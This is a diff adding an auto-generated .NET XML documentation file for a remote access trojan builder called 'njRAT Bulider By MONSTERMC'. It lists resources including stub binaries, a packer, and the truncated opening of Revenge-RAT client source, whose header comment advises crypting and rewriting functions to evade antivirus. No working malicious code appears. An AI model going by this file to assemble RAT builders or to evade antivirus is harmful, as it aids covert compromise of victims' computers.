@@ -1,0 +1,106 @@
+﻿<?xml version="1.0"?>
+<doc>
+<assembly>
+<name>
+njRAT Bulider By MONSTERMC
+</name>
+</assembly>
+<members>
+<member name="T:njRAT_Bulider_By_MONSTERMC.My.Resources.Resources">
+<summary>
+  A strongly-typed resource class, for looking up localized strings, etc.
+</summary>
+</member>
+<member name="P:njRAT_Bulider_By_MONSTERMC.My.Resources.Resources.ResourceManager">
+<summary>
+  Returns the cached ResourceManager instance used by this class.
+</summary>
+</member>
+<member name="P:njRAT_Bulider_By_MONSTERMC.My.Resources.Resources.Culture">
+<summary>
+  Overrides the current thread's CurrentUICulture property for all
+  resource lookups using this strongly typed resource class.
+</summary>
+</member>
+<member name="P:njRAT_Bulider_By_MONSTERMC.My.Resources.Resources._2635454_email_mail_social_telegram_icon">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:njRAT_Bulider_By_MONSTERMC.My.Resources.Resources._437944_youtube_player_screen_technology_tv_icon">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:njRAT_Bulider_By_MONSTERMC.My.Resources.Resources._me">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:njRAT_Bulider_By_MONSTERMC.My.Resources.Resources.Blog_icon">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:njRAT_Bulider_By_MONSTERMC.My.Resources.Resources.Client">
+<summary>
+  Looks up a localized string similar to &apos; Fixed By NYAN CAT \\ JAN 9TH, 2018
+
+&apos; Revenge-RAT Client Source Code v0.3
+&apos; By N A P O L E O N
+&apos; You can update/Crypt the client again, learn if you want , some codes typed direct for beginners
+&apos; if you want good result in runtime vs AV, rewrite some functions much as you can
+&apos; Last edit: 2016/12/9
+
+Imports Microsoft.Win32
+Imports Microsoft.VisualBasic.Devices
+Imports System.Management
+Imports System
+Imports System.Net.Sockets
+Imports Microsoft.VisualBasic
+Imports System.IO.Compression
+Impo [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:njRAT_Bulider_By_MONSTERMC.My.Resources.Resources.DISCORD">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:njRAT_Bulider_By_MONSTERMC.My.Resources.Resources.icons8_visual_studio_2019_64">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:njRAT_Bulider_By_MONSTERMC.My.Resources.Resources.MONSTERMC">
+<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member>
+<member name="P:njRAT_Bulider_By_MONSTERMC.My.Resources.Resources.mpress">
+<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member>
+<member name="P:njRAT_Bulider_By_MONSTERMC.My.Resources.Resources.Stub">
+<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member>
+<member name="P:njRAT_Bulider_By_MONSTERMC.My.Resources.Resources.Stub1">
+<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member>
+<member name="P:njRAT_Bulider_By_MONSTERMC.My.Resources.Resources.vpn__1_">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:njRAT_Bulider_By_MONSTERMC.My.Resources.Resources.whatsapp__2_">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+</members>
+</doc>
